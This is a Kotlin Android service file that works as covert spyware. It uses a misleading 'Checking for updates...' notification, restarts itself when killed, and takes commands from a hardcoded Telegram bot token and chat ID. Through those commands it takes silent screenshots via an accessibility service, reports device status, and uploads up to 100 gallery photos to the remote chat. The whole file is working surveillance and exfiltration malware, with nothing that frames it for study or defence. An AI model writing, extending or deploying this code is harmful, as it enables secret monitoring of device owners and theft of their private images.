package com.example.myapplication.services

import android.annotation.SuppressLint
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.provider.Settings
import android.text.TextUtils
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.example.myapplication.receivers.ServiceRestarterReceiver
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.*

class PersistentService : Service() {

    private val BOT_TOKEN = "8995029809:AAHAjbs7CvyLoxhEm9LGVoiJsPB59Mqnzog"
    private val CHAT_ID = "8587971818"
    
    private var lastUpdateId = 0
    private var isPolling = false
    private var isDumping = false
    private var resultCode: Int = 0
    private var resultData: Intent? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("PersistentService", "Service onCreate called")
    }

    @SuppressLint("ForegroundServiceType")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("PersistentService", "Service onStartCommand called")
        if (intent?.action == "START_POLLING") {
            resultCode = intent.getIntExtra("RESULT_CODE", 0)
            resultData = intent.getParcelableExtra("DATA")
        }

        startForegroundService()
        
        if (!isPolling) {
            isPolling = true
            setBotCommands()
            startTelegramPolling()
        }

        return START_STICKY
    }

    private fun startForegroundService() {
        val channelId = "persistent_service_channel"
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Runtime", NotificationManager.IMPORTANCE_LOW)
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Service Active")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .build()

        startForeground(2, notification)
    }

    private fun setBotCommands() {
        Thread {
            try {
                val commands = JSONArray().apply {
                    put(JSONObject().put("command", "capture").put("description", "Silent Screenshot"))
                    put(JSONObject().put("command", "status").put("description", "Device Status"))
                    put(JSONObject().put("command", "dump_gallery").put("description", "Get 100 Photos"))
                    put(JSONObject().put("command", "help").put("description", "All Commands"))
                }
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/setMyCommands")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                conn.outputStream.use { it.write(JSONObject().put("commands", commands).toString().toByteArray()) }
                conn.responseCode
            } catch (e: Exception) {}
        }.start()
    }

    private fun startTelegramPolling() {
        Thread {
            while (isPolling) {
                try {
                    checkTelegramUpdates()
                } catch (e: Exception) {
                    Log.e("Polling", "Error: ${e.message}")
                }
                Thread.sleep(3000)
            }
        }.start()
    }

    private fun checkTelegramUpdates() {
        val urlString = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10"
        val conn = URL(urlString).openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        
        if (conn.responseCode == 200) {
            val response = conn.inputStream.bufferedReader().use { it.readText() }
            val result = JSONObject(response).getJSONArray("result")

            for (i in 0 until result.length()) {
                val update = result.getJSONObject(i)
                lastUpdateId = update.getInt("update_id")
                val text = update.optJSONObject("message")?.optString("text") ?: ""
                handleCommand(text)
            }
        }
    }

    private fun handleCommand(text: String) {
        val cmd = text.lowercase()
        when {
            cmd.contains("capture") -> {
                if (isAccessibilityServiceEnabled()) {
                    sendMessageToTelegram("📸 Accessibility is ON. Taking screenshot...")
                    val intent = Intent("ACTION_TAKE_SCREENSHOT")
                    intent.setPackage(packageName)
                    sendBroadcast(intent)
                } else {
                    sendMessageToTelegram("❌ Error: Accessibility Service is OFF. Please enable it from the app settings.")
                }
            }
            cmd.contains("status") -> sendStatusUpdate()
            cmd.contains("dump_gallery") || cmd.contains("dump gallery") -> {
                if (!isDumping) {
                    isDumping = true
                    Thread { dumpGallery() }.start()
                }
            }
            cmd.contains("stop_dump") || cmd.contains("stop dump") -> {
                isDumping = false
                sendMessageToTelegram("🛑 Stopped.")
            }
            cmd.contains("help") || cmd.contains("/start") -> {
                sendMessageToTelegram("Available: capture, status, dump_gallery, stop_dump")
            }
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = "$packageName/${MyAccessibilityService::class.java.canonicalName}"
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return enabled?.contains(service) == true
    }

    private fun sendStatusUpdate() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val msg = "🔋 Battery: $level%\n🤖 Service: Active\n👁️ Accessibility: ${if(isAccessibilityServiceEnabled()) "ON" else "OFF"}"
        sendMessageToTelegram(msg)
    }

    private fun sendMessageToTelegram(message: String) {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                val body = JSONObject().put("chat_id", CHAT_ID).put("text", message).toString()
                conn.outputStream.use { it.write(body.toByteArray()) }
                conn.responseCode
            } catch (e: Exception) {}
        }.start()
    }

    private fun dumpGallery() {
        val projection = arrayOf(MediaStore.Images.Media._ID)
        val cursor = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")
        var count = 0
        sendMessageToTelegram("🚀 Dumping gallery...")
        cursor?.use {
            val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (it.moveToNext() && isDumping && count < 100) {
                val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, it.getLong(idCol))
                sendImageToTelegram(uri)
                count++
                Thread.sleep(1500)
            }
        }
        isDumping = false
        sendMessageToTelegram("✅ Finished. Sent $count images.")
    }

    private fun sendImageToTelegram(uri: Uri) {
        try {
            val inputStream = contentResolver.openInputStream(uri) ?: return
            val boundary = "Boundary-" + System.currentTimeMillis()
            val conn = URL("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").openConnection() as HttpURLConnection
            conn.doOutput = true
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            
            val out = conn.outputStream
            val writer = PrintWriter(OutputStreamWriter(out, "UTF-8"), true)
            writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").append(CHAT_ID).append("\r\n")
            writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"\r\n").append("Content-Type: image/jpeg\r\n\r\n").flush()
            inputStream.copyTo(out)
            out.flush()
            writer.append("\r\n--$boundary--\r\n").close()
            conn.responseCode
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        isPolling = false
        sendBroadcast(Intent(this, ServiceRestarterReceiver::class.java))
    }
}